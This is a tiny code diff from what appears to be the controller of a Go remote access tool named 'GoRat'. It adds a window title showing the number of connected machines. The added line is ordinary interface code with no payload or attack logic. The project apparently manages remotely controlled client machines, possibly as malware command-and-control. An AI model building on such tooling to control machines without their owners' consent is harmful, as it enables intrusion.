@@ -17,6 +17,8 @@ type EncodedDataStruct struct {
 }
 
 func CreateClientTable() []*go_rat.TableRowWidget {
+	go_rat.Window(fmt.Sprintf("GoRat - %d Connected Machines", len(database.GetConnections())))
+
 	rows := make([]*go_rat.TableRowWidget, 0)
 	connections := database.GetConnections()
 
